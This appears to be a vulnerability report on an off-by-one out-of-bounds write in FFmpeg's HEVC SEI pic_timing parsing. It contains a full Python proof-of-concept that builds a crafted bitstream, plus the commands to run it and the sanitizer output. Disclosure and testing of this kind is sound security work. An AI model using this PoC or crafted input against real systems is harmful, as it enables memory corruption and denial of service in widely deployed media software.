## Bug0: Off-by-one OOB Write in HEVC SEI pic_timing num_decoding_units_minus1 Loop

### Summary

In `libavcodec/cbs_h265_syntax_template.c`, `FUNC(sei_pic_timing)()` validates `num_decoding_units_minus1` against the upper bound `HEVC_MAX_SLICE_SEGMENTS` (600), but the fixed-size array `num_nalus_in_du_minus1` is declared with exactly 600 elements (valid indices 0–599). When `num_decoding_units_minus1` equals 600, the loop `for (i = 0; i <= current->num_decoding_units_minus1; i++)` writes to index 600 — one past the end of the array — constituting a CWE-787 out-of-bounds write. The write lands inside the adjacent struct field `du_cpb_removal_delay_increment_minus1[0]`, corrupting it with an attacker-controlled two-byte value and potentially causing downstream data corruption or DoS.

### PoC

A Python script constructs a minimal HEVC raw bitstream (`poc_input.hevc`) containing a crafted SEI prefix NAL unit with a `pic_timing` message setting `num_decoding_units_minus1=600`; the bug is triggered when `ffmpeg` processes the file through the `trace_headers` bitstream filter, which invokes the CBS HEVC parser.

```python
#!/usr/bin/env python3
"""
PoC: Off-by-one OOB Write in FFmpeg HEVC CBS SEI pic_timing parsing.
Triggers FUNC(sei_pic_timing)() to write num_nalus_in_du_minus1[600] OOB.
Requires: ffmpeg built with UBSan/ASAN (-fsanitize=address,undefined).
Run: python3 gen.py
     ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
       ./ffmpeg -f hevc -i poc_input.hevc -c:v copy -bsf:v trace_headers -f null -
"""

import struct, sys, os

class BitWriter:
    def __init__(self):
        self._bits = []
    def write_bit(self, b):
        self._bits.append(b & 1)
    def write_bits(self, value, n):
        for i in range(n - 1, -1, -1):
            self._bits.append((value >> i) & 1)
    def write_ue(self, value):
        if value == 0:
            self._bits.append(1)
            return
        x = value + 1
        length = x.bit_length()
        for _ in range(length - 1):
            self._bits.append(0)
        for i in range(length - 1, -1, -1):
            self._bits.append((x >> i) & 1)
    def write_se(self, value):
        self.write_ue(2 * value - 1) if value > 0 else self.write_ue(-2 * value)
    def write_rbsp_trailing(self):
        self._bits.append(1)
        while len(self._bits) % 8 != 0:
            self._bits.append(0)
    def to_bytes(self):
        bits = list(self._bits)
        while len(bits) % 8 != 0:
            bits.append(0)
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)
    def bit_count(self):
        return len(self._bits)

def apply_emulation_prevention(data):
    result = bytearray()
    zero_count = 0
    for b in data:
        if zero_count == 2 and b in (0x00, 0x01, 0x02, 0x03):
            result.append(0x03)
            zero_count = 0
        result.append(b)
        zero_count = (zero_count + 1) if b == 0x00 else 0
    return bytes(result)

def make_nal(nal_type, rbsp_bytes):
    header = bytes([nal_type << 1, 0x01])
    return b'\x00\x00\x00\x01' + header + apply_emulation_prevention(rbsp_bytes)

def write_profile_tier_level(bw):
    bw.write_bits(0, 2); bw.write_bit(0); bw.write_bits(1, 5)
    bw.write_bits(0x40000000, 32)
    bw.write_bit(1); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bits(0, 43); bw.write_bit(0); bw.write_bits(30, 8)

def write_sub_layer_hrd_parameters(bw):
    bw.write_ue(0); bw.write_ue(0); bw.write_ue(0); bw.write_ue(0); bw.write_bit(0)

def write_hrd_parameters(bw):
    bw.write_bit(1); bw.write_bit(0)          # nal=1, vcl=0
    bw.write_bit(1); bw.write_bits(0, 8)      # sub_pic=1, tick_divisor_minus2=0
    bw.write_bits(15, 5); bw.write_bit(1)     # du_delay_len=15, sub_pic_cpb_in_sei=1 (KEY)
    bw.write_bits(0, 5)                        # dpb_output_delay_du_len=0
    bw.write_bits(0, 4); bw.write_bits(0, 4); bw.write_bits(0, 4)
    bw.write_bits(0, 5); bw.write_bits(0, 5); bw.write_bits(0, 5)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(1)
    write_sub_layer_hrd_parameters(bw)

def build_vps():
    bw = BitWriter()
    bw.write_bits(0, 4); bw.write_bit(1); bw.write_bit(1)
    bw.write_bits(0, 6); bw.write_bits(0, 3); bw.write_bit(1)
    bw.write_bits(0xFFFF, 16)
    write_profile_tier_level(bw)
    bw.write_bit(0); bw.write_ue(1); bw.write_ue(0); bw.write_ue(0)
    bw.write_bits(0, 6); bw.write_ue(0)
    bw.write_bit(0); bw.write_bit(0)
    bw.write_rbsp_trailing()
    return bw.to_bytes()

def build_sps():
    bw = BitWriter()
    bw.write_bits(0, 4); bw.write_bits(0, 3); bw.write_bit(1)
    write_profile_tier_level(bw)
    bw.write_ue(0); bw.write_ue(1)
    bw.write_ue(64); bw.write_ue(64); bw.write_bit(0)
    bw.write_ue(0); bw.write_ue(0); bw.write_ue(4)
    bw.write_bit(0); bw.write_ue(1); bw.write_ue(0); bw.write_ue(0)
    bw.write_ue(0); bw.write_ue(3); bw.write_ue(0); bw.write_ue(3)
    bw.write_ue(0); bw.write_ue(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_ue(0); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(1)  # vui_parameters_present_flag
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(1)  # vui_timing_info_present_flag
    bw.write_bits(1, 32); bw.write_bits(30, 32); bw.write_bit(0)
    bw.write_bit(1)  # vui_hrd_parameters_present_flag
    write_hrd_parameters(bw)
    bw.write_bit(0); bw.write_bit(0)
    bw.write_rbsp_trailing()
    return bw.to_bytes()

def build_pps():
    bw = BitWriter()
    bw.write_ue(0); bw.write_ue(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bits(0, 3)
    bw.write_bit(0); bw.write_bit(0)
    bw.write_ue(0); bw.write_ue(0); bw.write_se(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_se(0); bw.write_se(0); bw.write_bit(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(0); bw.write_bit(0)
    bw.write_bit(1); bw.write_bit(1); bw.write_bit(0); bw.write_bit(0)
    bw.write_se(0); bw.write_se(0)
    bw.write_bit(0); bw.write_bit(0); bw.write_ue(0); bw.write_bit(0); bw.write_bit(0)
    bw.write_rbsp_trailing()
    return bw.to_bytes()

def build_sei_prefix():
    bw = BitWriter()
    bw.write_bits(0, 1)   # au_cpb_removal_delay_minus1 (1 bit)
    bw.write_bits(0, 1)   # pic_dpb_output_delay (1 bit)
    bw.write_bits(0, 1)   # pic_dpb_output_du_delay (1 bit)
    bw.write_ue(600)      # num_decoding_units_minus1 = 600 ← OOB trigger
    bw.write_bit(1)       # du_common_cpb_removal_delay_flag
    bw.write_bits(0, 16)  # du_common_cpb_removal_delay_increment_minus1
    for i in range(601):  # loop writes index 600 OOB
        bw.write_ue(0)
    payload = bw.to_bytes()
    sei_rbsp = bytearray()
    sei_rbsp.append(1)               # SEI type: pic_timing
    sei_rbsp.append(len(payload))    # payload size
    sei_rbsp.extend(payload)
    sei_rbsp.append(0x80)            # RBSP trailing
    return bytes(sei_rbsp)

def main():
    out = 'poc_input.hevc'
    bitstream = bytearray()
    bitstream.extend(make_nal(32, build_vps()))        # VPS
    bitstream.extend(make_nal(33, build_sps()))        # SPS
    bitstream.extend(make_nal(34, build_pps()))        # PPS
    bitstream.extend(make_nal(39, build_sei_prefix())) # SEI prefix (pic_timing)
    bitstream.extend(make_nal(19, bytes([0xA0, 0x00])))# IDR stub
    bitstream.extend(make_nal(35, bytes([0x10])))      # AUD (flushes packet)
    with open(out, 'wb') as f:
        f.write(bitstream)
    print(f'[+] Written {len(bitstream)} bytes to {out}')
    print('[+] SEI pic_timing: num_decoding_units_minus1=600 → OOB write at index 600')

if __name__ == '__main__':
    main()
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" \
  ./build_test/ffmpeg -f hevc -i poc_input.hevc -c:v copy -bsf:v trace_headers -f null -
cat asan.log.*
```

### Result

Running the PoC triggers UBSan in `FUNC(sei_pic_timing)()` during CBS parsing of the crafted SEI prefix NAL unit via the `trace_headers` bitstream filter: `cbs_h265_syntax_template.c:2005:17: runtime error: index 600 out of bounds for type 'uint16_t [600]'`. The out-of-bounds write at `num_nalus_in_du_minus1[600]` falls within the same heap-allocated `H265RawSEIPicTiming` struct, overwriting the low two bytes of `du_cpb_removal_delay_increment_minus1[0]` with an attacker-controlled value and confirming CWE-787.
